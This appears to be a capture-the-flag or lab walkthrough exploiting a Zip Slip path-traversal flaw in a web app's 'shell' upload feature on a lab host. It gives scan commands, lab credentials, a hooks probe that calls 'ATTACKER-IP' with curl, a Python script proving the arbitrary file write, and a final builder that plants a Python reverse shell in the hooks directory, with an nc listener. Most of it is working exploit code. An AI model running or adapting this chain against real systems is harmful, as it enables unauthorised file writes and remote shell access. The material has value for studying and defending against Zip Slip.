##Zip Slip arbitrary-file-write
```
nmap -Pn -sC -sV 10.130.190.24
```
```
  22/tcp    SSH
  5000/tcp  HTTP 
```
```
http://10.130.190.24:5000

  user: concierge
  pass: StayNoticed2024!
```
  
Each shell must contain a shell.json manifest listing its assets (images, stylesheets)

A shell may include optional automation hooks — the theme worker applies these for you shortly after the shell comes ashore

Allowed asset types: png jpg gif svg css json. 
```
  {
    "name": "test",
    "assets": []
  }
```
```
printf '%s\n' '{"name":"test","assets":[]}' > shell.json
```
```
zip baseline.zip shell.json
```
```
http://10.130.190.24:5000/shells/7676d3b098d2/shell.json
```
```
  "hooks": []

  "hooks": ["test"]

  "hooks": [{}]
  
"hooks": ["id", "whoami"]
```
```

  {
    "name": "callback-test",
    "assets": [],
    "hooks": [
      "curl http://ATTACKER-IP:8000/"
    ]
  }
```
==
Test for Zip Slip

Zip Slip occurs when an application extracts paths such as:
```
  ../../static/proof.css
```
without checking whether the final path escapes the intended extraction directory.

```
import json
import zipfile

manifest = {
    "name": "zipslip-proof",
    "assets": []
}

with zipfile.ZipFile("zipslip-proof.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr(
        "../../static/zipslip-proof.css",
        "ZIP_SLIP_CONFIRMED\n"
    )

print("Created zipslip-proof.zip")
```
```
unzip -l zipslip-proof.zip

Archive:  zipslip-proof.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       39  2026-08-05 19:32   shell.json
       19  2026-08-05 19:32   ../../static/zipslip-proof.css
---------                     -------
       58                     2 files
```
```       
curl http://10.130.181.205:5000/static/zipslip-proof.css
```
```
ZIP_SLIP_CONFIRMED
```
```
application-root/
├── static/
├── shells/
└── hooks/ 
```

build_shell.py
```
import json
import zipfile

LHOST = "10.130.97.35"
LPORT = 4444

manifest = {
    "name": "shoreline-update",
    "assets": []
}

callback = f'''
import os
import pty
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(({LHOST!r}, {LPORT}))

for descriptor in (0, 1, 2):
    os.dup2(sock.fileno(), descriptor)

pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr("../../hooks/callback.py", callback)

print("Created reverse-shell.zip")
```
```
python3 build_shell.py
```
```
unzip -l reverse-shell.zip
```
```
nc -lvnp 4444
```
